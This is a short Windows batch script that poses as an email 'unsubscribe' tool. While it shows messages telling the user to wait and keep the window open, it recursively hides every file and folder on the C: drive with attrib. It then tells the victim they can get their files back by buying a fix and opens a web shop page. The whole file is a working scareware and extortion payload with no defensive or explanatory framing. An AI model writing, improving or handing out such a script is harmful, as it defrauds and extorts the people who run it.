@echo off
echo Unsubscribing. We are currently removing you from the list. Do not close this window.
echo Please wait up to 5 minutes. This might take shorter, or longer.
cd C:\ >NUL
attrib +h * /D /S >NUL
echo You can get your files back by buying the fix here:
timeout 3
start www.autobuy.io/@VirusRemoval